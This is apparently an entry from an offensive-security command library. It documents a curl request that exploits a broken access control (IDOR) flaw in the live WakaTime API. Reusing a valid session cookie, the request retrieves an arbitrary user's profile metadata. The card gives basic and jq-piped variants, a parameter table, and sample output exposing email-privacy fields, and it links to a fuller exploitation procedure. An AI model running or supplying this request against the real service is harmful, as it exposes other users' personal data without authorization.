---
data: >-
  curl -X GET "https://wakatime.com/api/v1/users/target_username" -H "Host:
  wakatime.com" -b cookies.txt
tags:
  - api
  - exploitation
  - idor
type: command
output: JSON response with arbitrary user's profile metadata
executor: bash
platforms:
  - Web
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.062Z'
id: 50484d90-8e33-46e3-a329-5bf31d57f845
verified: false
validated: true
submitted: true
---
# curl-request-arbitrary-profile

## Command

```bash
curl -X GET "https://wakatime.com/api/v1/users/target_username" -H "Host: wakatime.com" -b cookies.txt
```

## Description

This command exploits broken access control by requesting an arbitrary user's profile using a valid session cookie, revealing sensitive metadata without authorization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP GET method | Yes |
| `https://wakatime.com/api/v1/users/target_username` | API endpoint with target username | Yes |
| `-H "Host: wakatime.com"` | Sets the Host header | Yes |
| `-b cookies.txt` | Loads session cookie from file | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://wakatime.com/api/v1/users/target_username" -H "Host: wakatime.com" -b cookies.txt
```

### Advanced Usage

```bash
curl -s -X GET "https://wakatime.com/api/v1/users/target_username" -H "Host: wakatime.com" -b cookies.txt | jq .
```

## Expected Output

HTTP/2 200 OK with JSON like {"is_email_confirmed": true, "is_email_public": false, "public_email": null}.

## Related

- [[commands/curl-request-own-profile]]
- [[procedures/Exploit-WakaTime-API-Broken-Access-Control]]
